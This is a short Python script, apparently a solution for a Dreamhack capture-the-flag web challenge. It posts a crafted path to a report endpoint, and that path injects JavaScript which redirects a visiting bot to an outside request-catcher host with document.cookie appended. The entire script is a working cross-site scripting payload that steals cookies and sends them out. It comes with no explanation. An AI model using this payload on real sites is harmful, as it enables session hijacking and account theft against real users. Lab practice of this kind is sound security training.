import requests

port = 21534
url_index = f"http://host3.dreamhack.games:{port}/"
url_report = url_index + "report.php"

param = {
    "path": "vuln.php/;location.href='https://umorhmv.request.dreamhack.games/'+document.cookie;//"
}
r = requests.post(url_report, data=param)
print(r.text)
